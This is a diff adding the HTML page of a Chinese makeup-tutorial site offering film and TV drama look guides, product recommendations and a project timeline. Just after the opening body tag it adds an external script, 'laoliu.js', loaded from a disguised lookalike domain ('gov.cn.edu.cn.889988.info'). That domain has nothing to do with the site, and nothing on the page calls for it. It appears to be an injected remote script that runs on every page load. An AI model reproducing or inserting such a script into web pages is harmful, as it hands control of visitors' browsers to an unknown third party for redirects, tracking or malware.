@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>影视化妆 - 影视剧同款妆容教程与美妆产品推荐</title>
+<meta name="description" content="影视化妆分享热门影视剧同款妆容教程、仿妆技巧、美妆产品推荐，从日常通勤到角色仿妆，一站式学化妆，手机端自适应浏览。">
+<meta name="keywords" content="影视化妆,影视剧妆容,仿妆教程,美妆推荐,同款妆容,化妆技巧">
+<link rel="canonical" href="https://yingshihuazhuang-h5.github.io/">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"Didot","Bodoni MT","PingFang SC","Microsoft YaHei",serif;
+  background:#fdf8f4;color:#3d3028;line-height:1.8;
+  overflow-x:hidden;
+}
+a{text-decoration:none;color:inherit}
+img{max-width:100%;display:block}
+section[id]{scroll-margin-top:0}
+
+/* 全屏首屏 */
+.cover{
+  position:relative;height:100vh;min-height:600px;
+  background:url("https://picsum.photos/1600/1000?random=501") center/cover no-repeat;
+  display:flex;align-items:flex-end;
+}
+.cover::after{
+  content:'';position:absolute;inset:0;
+  background:linear-gradient(180deg,transparent 40%,rgba(0,0,0,.65));
+}
+.cover-content{
+  position:relative;z-index:2;padding:60px 24px;max-width:1200px;margin:0 auto;width:100%;
+}
+.cover-content .eyebrow{
+  font-size:11px;letter-spacing:4px;text-transform:uppercase;color:#f0c8a0;margin-bottom:16px;
+}
+.cover-content h1{
+  font-size:clamp(40px,8vw,80px);font-weight:400;color:#fff;line-height:1.1;
+  font-family:"Didot","Bodoni MT",serif;
+}
+.cover-content h1 i{font-style:italic;color:#f0c8a0}
+.cover-content p{
+  color:#e8d5c4;font-size:16px;max-width:520px;margin:20px 0 28px;
+}
+.cover-btn{
+  display:inline-block;padding:14px 36px;background:#f0c8a0;color:#3d3028;
+  font-size:14px;letter-spacing:2px;text-transform:uppercase;font-weight:600;
+}
+.cover-btn:hover{background:#fff}
+
+/* 顶部极简导航 */
+.top-nav{
+  position:fixed;top:0;left:0;right:0;z-index:100;
+  padding:20px 24px;transition:.3s;
+}
+.top-nav.scrolled{
+  background:rgba(253,248,244,.95);backdrop-filter:blur(10px);
+  padding:12px 24px;border-bottom:1px solid #e8ddd3;
+}
+.top-nav.scrolled .nav-brand,.top-nav.scrolled .nav-links a{color:#3d3028}
+.nav-inner{
+  max-width:1200px;margin:0 auto;display:flex;justify-content:space-between;align-items:center;
+}
+.nav-brand{font-size:18px;font-weight:700;letter-spacing:2px;color:#fff;transition:.3s}
+.nav-links{display:flex;gap:28px}
+.nav-links a{font-size:13px;letter-spacing:1px;color:#fff;transition:.3s;text-transform:uppercase}
+.nav-links a:hover{color:#f0c8a0}
+
+/* 通用区块 */
+.section{padding:100px 24px;max-width:1200px;margin:0 auto}
+.section-label{
+  font-size:11px;letter-spacing:4px;text-transform:uppercase;color:#c9a87a;
+  margin-bottom:12px;display:block;
+}
+.section-title{
+  font-size:clamp(28px,4vw,42px);font-weight:400;margin-bottom:16px;
+  font-family:"Didot","Bodoni MT",serif;
+}
+.section-desc{font-size:15px;color:#7a6a5e;max-width:600px;margin-bottom:50px}
+
+/* 妆容教程 - 交错网格 */
+.tutorial-grid{
+  display:grid;grid-template-columns:1fr 1fr;gap:40px;
+}
+.tutorial-item:nth-child(even){margin-top:80px}
+.tutorial-item img{
+  width:100%;height:380px;object-fit:cover;border-radius:2px;
+}
+.tutorial-item .t-num{
+  font-size:11px;letter-spacing:3px;color:#c9a87a;margin:16px 0 8px;
+}
+.tutorial-item h3{font-size:20px;font-weight:600;margin-bottom:8px}
+.tutorial-item p{font-size:14px;color:#7a6a5e;line-height:1.7}
+.tutorial-meta{
+  display:flex;gap:14px;margin-top:12px;flex-wrap:wrap;
+}
+.tutorial-meta span{
+  font-size:11px;color:#c9a87a;padding:4px 12px;
+  border:1px solid #e8ddd3;border-radius:20px;
+}
+
+/* 影视同款 - 全宽分割 */
+.split-section{
+  display:grid;grid-template-columns:1fr 1fr;gap:0;
+  min-height:500px;
+}
+.split-image{position:relative;overflow:hidden}
+.split-image img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover}
+.split-content{
+  background:#f5ebe0;padding:60px 50px;display:flex;flex-direction:column;justify-content:center;
+}
+.split-content h3{font-size:24px;font-weight:600;margin-bottom:14px}
+.split-content p{font-size:14px;color:#7a6a5e;margin-bottom:16px}
+.split-content ul{list-style:none;margin-bottom:20px}
+.split-content ul li{
+  padding:10px 0;border-bottom:1px solid #e8ddd3;font-size:14px;color:#5a4a3e;
+}
+.split-content ul li::before{content:'✦ ';color:#c9a87a}
+.split-tag{
+  display:inline-block;font-size:11px;color:#c9a87a;letter-spacing:2px;
+  text-transform:uppercase;margin-bottom:8px;
+}
+
+/* 产品推荐 - 圆形色块 */
+.products{display:grid;grid-template-columns:repeat(4,1fr);gap:24px}
+.product{
+  text-align:center;cursor:pointer;
+}
+.product .circle{
+  width:180px;height:180px;border-radius:50%;
+  margin:0 auto 18px;overflow:hidden;
+  transition:transform .4s;
+}
+.product:hover .circle{transform:scale(1.08)}
+.product .circle img{width:100%;height:100%;object-fit:cover}
+.product h4{font-size:14px;font-weight:600;margin-bottom:4px}
+.product .brand{font-size:12px;color:#c9a87a;letter-spacing:1px;margin-bottom:6px}
+.product .price{font-size:13px;color:#7a6a5e}
+
+/* 编辑手记 - 引用块 */
+.editorial{
+  background:#f5ebe0;padding:80px 24px;text-align:center;
+}
+.editorial-inner{max-width:800px;margin:0 auto}
+.editorial-quote{
+  font-size:clamp(20px,3vw,32px);font-style:italic;line-height:1.6;
+  color:#3d3028;margin-bottom:24px;font-family:"Didot","Bodoni MT",serif;
+}
+.editorial-quote::before{content:'"';display:block;font-size:60px;color:#c9a87a;line-height:.5}
+.editorial-author{font-size:12px;letter-spacing:3px;color:#c9a87a;text-transform:uppercase}
+
+/* 关于 - 时间线 */
+.timeline{position:relative;padding-left:40px}
+.timeline::before{
+  content:'';position:absolute;left:12px;top:0;bottom:0;width:1px;background:#e8ddd3;
+}
+.tl-item{position:relative;margin-bottom:36px}
+.tl-item::before{
+  content:'';position:absolute;left:-34px;top:6px;width:11px;height:11px;
+  border-radius:50%;background:#c9a87a;border:3px solid #fdf8f4;
+}
+.tl-year{font-size:12px;letter-spacing:2px;color:#c9a87a;margin-bottom:4px}
+.tl-item h3{font-size:16px;font-weight:600;margin-bottom:4px}
+.tl-item p{font-size:14px;color:#7a6a5e}
+
+/* 页脚 */
+.footer{
+  background:#3d3028;color:#e8d5c4;padding:60px 24px 30px;
+}
+.footer-inner{max-width:1200px;margin:0 auto;display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:40px}
+.footer-brand{font-size:22px;font-weight:700;letter-spacing:2px;margin-bottom:14px}
+.footer-desc{font-size:13px;color:#a08e80;line-height:1.8}
+.footer-col h4{font-size:13px;letter-spacing:2px;margin-bottom:16px;color:#f0c8a0}
+.footer-col a{display:block;font-size:13px;color:#a08e80;padding:5px 0}
+.footer-col a:hover{color:#f0c8a0}
+.footer-bottom{
+  max-width:1200px;margin:40px auto 0;padding-top:24px;
+  border-top:1px solid #5a4a3e;text-align:center;font-size:11px;color:#7a6a5e;
+}
+
+@media(max-width:900px){
+  .nav-links{display:none}
+  .tutorial-grid{grid-template-columns:1fr}
+  .tutorial-item:nth-child(even){margin-top:0}
+  .split-section{grid-template-columns:1fr}
+  .split-image{min-height:300px;position:relative}
+  .split-image img{position:relative}
+  .split-content{padding:40px 24px}
+  .products{grid-template-columns:1fr 1fr}
+  .product .circle{width:140px;height:140px}
+  .footer-inner{grid-template-columns:1fr 1fr}
+  .cover-content h1{font-size:40px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 导航 -->
+<div class="top-nav" id="topNav">
+  <div class="nav-inner">
+    <div class="nav-brand">影视化妆</div>
+    <nav class="nav-links">
+      <a href="#home">首页</a>
+      <a href="#tutorial">妆容教程</a>
+      <a href="#looks">影视同款</a>
+      <a href="#products">产品推荐</a>
+      <a href="#about">关于</a>
+    </nav>
+  </div>
+</div>
+
+<!-- 全屏首屏 -->
+<section class="cover" id="home">
+  <div class="cover-content">
+    <div class="eyebrow">Yingshi Huazhuang</div>
+    <h1>影视<i>化妆</i></h1>
+    <p>从银幕到梳妆台，拆解热门影视剧同款妆容，分享实用化妆技巧与产品推荐，让每个女孩都能画出属于自己的主角光环。</p>
+    <a href="#tutorial" class="cover-btn">探索妆容</a>
+  </div>
+</section>
+
+<!-- 妆容教程 -->
+<section class="section" id="tutorial">
+  <span class="section-label">Tutorial</span>
+  <h2 class="section-title">热门妆容教程</h2>
+  <p class="section-desc">每期拆解一个影视角色妆容，从底妆到唇色，手把手教你复刻银幕经典。</p>
+  <div class="tutorial-grid">
+    <div class="tutorial-item">
+      <img src="https://picsum.photos/600/800?random=511" alt="影视化妆 繁花李李妆容教程">
+      <div class="t-num">NO. 01</div>
+      <h3>《繁花》李李 · 90年代港风妆</h3>
+      <p>哑光底妆搭配上扬眼线，重现90年代上海滩的摩登与神秘。重点在于眉峰的锐利与唇色的浓郁对比。</p>
+      <div class="tutorial-meta">
+        <span>复古港风</span><span>进阶</span><span>8步完成</span>
+      </div>
+    </div>
+    <div class="tutorial-item">
+      <img src="https://picsum.photos/600/800?random=512" alt="影视化妆 玫瑰的故事妆容教程">
+      <div class="t-num">NO. 02</div>
+      <h3>《玫瑰的故事》黄亦玫 · 清透氧气妆</h3>
+      <p>以清透水润为底，强调自然好气色。关键在于液体腮红的叠加手法与野生眉的毛流感塑造。</p>
+      <div class="tutorial-meta">
+        <span>日常通勤</span><span>新手友好</span><span>5步完成</span>
+      </div>
+    </div>
+    <div class="tutorial-item">
+      <img src="https://picsum.photos/600/800?random=513" alt="影视化妆 庆余年仿妆教程">
+      <div class="t-num">NO. 03</div>
+      <h3>《庆余年》司理理 · 古风仕女妆</h3>
+      <p>古典美学与现代技法的融合。花钿点缀、远山眉形、点朱唇，还原古代女子的温婉与风情。</p>
+      <div class="tutorial-meta">
+        <span>古风仿妆</span><span>进阶</span><span>12步完成</span>
+      </div>
+    </div>
+    <div class="tutorial-item">
+      <img src="https://picsum.photos/600/800?random=514" alt="影视化妆 与凤行仿妆教程">
+      <div class="t-num">NO. 04</div>
+      <h3>《与凤行》沈璃 · 仙侠清冷妆</h3>
+      <p>以银白和淡紫为主调，打造不食人间烟火的仙侠感。重点在于眼妆的通透感和面部留白。</p>
+      <div class="tutorial-meta">
+        <span>仙侠风</span><span>创意妆</span><span>10步完成</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 影视同款 - 分割区 -->
+<section class="section" id="looks" style="padding:0;max-width:none">
+  <div class="split-section">
+    <div class="split-image">
+      <img src="https://picsum.photos/900/700?random=521" alt="影视化妆 影视同款妆容展示">
+    </div>
+    <div class="split-content">
+      <span class="split-tag">Look Book</span>
+      <h3>影视同款妆容档案</h3>
+      <p>精选近期热播影视剧中的经典妆造，逐一拆解色彩搭配、工具选择与手法要点。</p>
+      <ul>
+        <li>《墨雨云间》姜梨 · 复仇暗黑系唇妆</li>
+        <li>《长相思》小夭 · 精灵系碎钻眼妆</li>
+        <li>《去有风的地方》许红豆 · 素颜伪素颜</li>
+        <li>《一念关山》任如意 · 侠女英气眉形</li>
+        <li>《偷偷藏不住》桑稚 · 少女粉棕系眼影</li>
+      </ul>
+      <a href="#" style="color:#c9a87a;font-size:13px;letter-spacing:1px">查看完整妆容档案 →</a>
+    </div>
+  </div>
+  <div class="split-section">
+    <div class="split-content">
+      <span class="split-tag">Color Story</span>
+      <h3>角色色彩心理学</h3>
+      <p>每个角色的妆色选择都在传递情绪与故事。我们深入分析角色性格与妆色的关系，帮你理解为什么她涂这支口红。</p>
+      <ul>
+        <li>暖调橘棕 → 亲和、阳光、治愈系角色</li>
+ <li>冷调紫灰 → 神秘、疏离、反派或独立角色</li>
+        <li>正红哑光 → 自信、强势、女王型角色</li>
+        <li>裸粉珠光 → 纯真、初恋、少女型角色</li>
+        <li>深棕烟熏 → 压抑、暗黑、复仇型角色</li>
+      </ul>
+      <a href="#" style="color:#c9a87a;font-size:13px;letter-spacing:1px">阅读色彩分析专栏 →</a>
+    </div>
+    <div class="split-image">
+      <img src="https://picsum.photos/900/700?random=522" alt="影视化妆 色彩分析展示">
+    </div>
+  </div>
+</section>
+
+<!-- 产品推荐 -->
+<section class="section" id="products">
+  <span class="section-label">Products</span>
+  <h2 class="section-title">编辑精选产品</h2>
+  <p class="section-desc">每期从影视妆容中提炼核心产品，经过实测筛选，推荐真正好用的美妆好物。</p>
+  <div class="products">
+    <div class="product">
+      <div class="circle"><img src="https://picsum.photos/300/300?random=531" alt="影视化妆推荐 哑光粉底液"></div>
+      <div class="brand">FOUNDATION</div>
+      <h4>持妆哑光粉底液</h4>
+      <div class="price">¥ 189</div>
+    </div>
+    <div class="product">
+      <div class="circle"><img src="https://picsum.photos/300/300?random=532" alt="影视化妆推荐 液体腮红"></div>
+      <div class="brand">BLUSH</div>
+      <h4>液体腮红 #蜜桃</h4>
+      <div class="price">¥ 88</div>
+    </div>
+    <div class="product">
+      <div class="circle"><img src="https://picsum.photos/300/300?random=533" alt="影视化妆推荐 眼影盘"></div>
+      <div class="brand">EYESHADOW</div>
+      <h4>九色眼影盘 #复古港风</h4>
+      <div class="price">¥ 158</div>
+    </div>
+    <div class="product">
+      <div class="circle"><img src="https://picsum.photos/300/300?random=534" alt="影视化妆推荐 丝绒口红"></div>
+      <div class="brand">LIPSTICK</div>
+      <h4>丝绒哑光唇釉 #红棕</h4>
+      <div class="price">¥ 99</div>
+    </div>
+  </div>
+</section>
+
+<!-- 编辑手记 -->
+<section class="editorial">
+  <div class="editorial-inner">
+    <p class="editorial-quote">化妆不是伪装，而是把角色的灵魂穿在脸上。每一笔都是对角色的理解，每一色都是对故事的致敬。</p>
+    <div class="editorial-author">— 影视化妆编辑部</div>
+  </div>
+</section>
+
+<!-- 关于 -->
+<section class="section" id="about">
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:60px">
+    <div>
+      <span class="section-label">About</span>
+      <h2 class="section-title">关于影视化妆</h2>
+      <p style="font-size:15px;color:#7a6a5e;line-height:1.8;margin-bottom:20px">影视化妆是一个专注于影视剧妆容拆解与美妆教学的内容平台。我们从热门电影、电视剧中提取妆容灵感，转化为普通人也能上手的实用教程。</p>
+      <p style="font-size:15px;color:#7a6a5e;line-height:1.8">官方网站：<strong style="color:#c9a87a">https://yingshihuazhuang-h5.github.io</strong></p>
+    </div>
+    <div>
+      <span class="section-label">Timeline</span>
+      <div class="timeline">
+        <div class="tl-item">
+          <div class="tl-year">2022</div>
+          <h3>项目启动</h3>
+          <p>从个人仿妆笔记开始，分享第一个影视角色妆容拆解。</p>
+        </div>
+        <div class="tl-item">
+          <div class="tl-year">2023</div>
+          <h3>内容体系化</h3>
+          <p>建立妆容教程、影视同款、产品推荐三大内容板块。</p>
+        </div>
+        <div class="tl-item">
+          <div class="tl-year">2024</div>
+          <h3>全平台覆盖</h3>
+          <p>推出移动端自适应站点，内容覆盖电影、电视剧、动漫角色妆造。</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 页脚 -->
+<footer class="footer">
+  <div class="footer-inner">
+    <div>
+      <div class="footer-brand">影视化妆</div>
+      <p class="footer-desc">从银幕到梳妆台，让每个人都能画出属于自己的主角光环。关注我们，每周更新热门影视妆容拆解。</p>
+    </div>
+    <div class="footer-col">
+      <h4>栏目</h4>
+      <a href="#tutorial">妆容教程</a>
+      <a href="#looks">影视同款</a>
+      <a href="#products">产品推荐</a>
+    </div>
+    <div class="footer-col">
+      <h4>热门标签</h4>
+      <a href="#">复古港风</a>
+      <a href="#">古风仕女</a>
+      <a href="#">仙侠清冷</a>
+      <a href="#">日常通勤</a>
+    </div>
+    <div class="footer-col">
+      <h4>关于</h4>
+      <a href="#about">关于我们</a>
+      <a href="#">投稿合作</a>
+      <a href="#">联系方式</a>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    © 2024 影视化妆 · 网站网址：https://yingshihuazhuang-h5.github.io
+  </div>
+</footer>
+
+<script>
+window.addEventListener('scroll',function(){
+  var nav=document.getElementById('topNav');
+  if(window.scrollY>80){nav.classList.add('scrolled')}else{nav.classList.remove('scrolled')}
+});
+</script>
+
+</body>
+</html>
